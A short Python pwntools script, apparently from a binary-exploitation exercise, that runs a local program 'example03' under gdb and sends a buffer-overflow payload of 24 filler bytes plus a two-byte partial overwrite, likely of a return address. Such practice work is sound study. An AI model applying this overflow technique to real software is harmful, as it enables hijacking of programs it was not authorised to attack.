from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = process('./example03')

gdb.attach(p,'b * readInput+48')

p.sendline(b'A'*24 + b'\x27' + b'\xaa')
p.interactive()
